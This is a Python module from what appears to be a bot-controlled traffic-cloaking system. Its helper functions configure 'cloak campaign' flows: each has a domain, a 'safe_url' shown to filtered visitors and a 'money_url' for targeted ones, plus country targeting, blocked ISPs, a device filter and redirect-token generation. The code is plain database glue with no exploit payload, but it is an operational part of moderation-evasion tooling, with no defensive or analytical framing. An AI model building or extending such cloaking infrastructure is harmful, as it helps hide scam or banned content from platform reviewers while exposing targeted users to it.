"""
High-level flow management used by bot handlers.
A "flow" is a named cloak campaign unit.
"""
from db.models import (
    flow_add, flow_remove, flow_list, flow_get, flow_update,
    link_create, link_revoke_all, link_list,
)


# ── Flow helpers ───────────────────────────────────────────────────────────────

def add_flow(flow_name: str) -> bool:
    return flow_add(flow_name.lower())


def remove_flow(flow_name: str) -> bool:
    return flow_remove(flow_name.lower())


def get_all_flows():
    return flow_list()


def get_flow(flow_name: str):
    return flow_get(flow_name.lower())


def require_flow(flow_name: str):
    """Return flow row or raise ValueError."""
    row = flow_get(flow_name.lower())
    if not row:
        raise ValueError(f"Flow `{flow_name}` not found. Create it first with /newflow.")
    return row


def set_domain(flow_name: str, domain: str) -> bool:
    return flow_update(flow_name.lower(), domain=domain.lower())


def set_safe_url(flow_name: str, url: str) -> bool:
    return flow_update(flow_name.lower(), safe_url=url)


def set_money_url(flow_name: str, url: str) -> bool:
    return flow_update(flow_name.lower(), money_url=url)


def set_countries(flow_name: str, countries: str) -> bool:
    return flow_update(flow_name.lower(), countries=countries.upper())


def set_threshold(flow_name: str, value: int) -> bool:
    return flow_update(flow_name.lower(), threshold=value)


def add_blocked_isp(flow_name: str, isp_name: str) -> bool:
    row = flow_get(flow_name.lower())
    if not row:
        return False
    existing = [x.strip() for x in (row["blocked_isps"] or "").split("|") if x.strip()]
    if isp_name not in existing:
        existing.append(isp_name)
    return flow_update(flow_name.lower(), blocked_isps="|".join(existing))


def set_device_filter(flow_name: str, device_filter: str) -> bool:
    return flow_update(flow_name.lower(), device_filter=device_filter)


def set_notify_group(flow_name: str, group_id: str) -> bool:
    return flow_update(flow_name.lower(), notify_group=group_id)


def set_notify_enabled(flow_name: str, enabled: bool) -> bool:
    return flow_update(flow_name.lower(), notify_enabled=int(enabled))


def set_notify_level(flow_name: str, level: str) -> bool:
    return flow_update(flow_name.lower(), notify_level=level)


# ── Token helpers ──────────────────────────────────────────────────────────────

def generate_token(flow_name: str) -> str:
    row = require_flow(flow_name)
    return link_create(flow_name.lower(), row["domain"])


def regenerate_token(flow_name: str) -> str:
    row = require_flow(flow_name)
    link_revoke_all(flow_name.lower())
    return link_create(flow_name.lower(), row["domain"])


def get_active_links(flow_name: str):
    return link_list(flow_name.lower())


def token_url(domain: str, token: str) -> str:
    return f"https://{domain}/go/{token}"
